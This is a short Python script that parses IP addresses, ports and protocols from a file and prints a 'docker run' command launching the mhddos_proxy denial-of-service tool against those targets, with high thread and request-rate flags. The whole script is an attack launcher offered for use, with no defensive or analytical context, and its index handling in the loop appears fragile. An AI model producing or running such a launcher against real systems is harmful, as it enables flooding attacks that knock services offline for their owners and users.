import re

###templates for file
templ_begin = "docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest "
templ_end = " -t 1000 --rpc 1000  --debug"

file1 = open('raw_file_test', 'r')
Lines = file1.readlines()

###start file
print(templ_begin, end=" ")

###for line in Lines1:
for line in Lines:
      result = re.findall("[0-9]+.[0-9]+.[0-9]+.[0-9]+|[0-9]+|tcp|udp", line.strip())
      if len(result) > 1:
         #print(result)

         r = 1 
         while r < len(result):
            #print (r, len(result))
      
            print (result[r+1]+"://"+result[0]+":"+result[r], end=" ")
            r += 2

file1.close()

###end file
print (templ_end, end=" ")
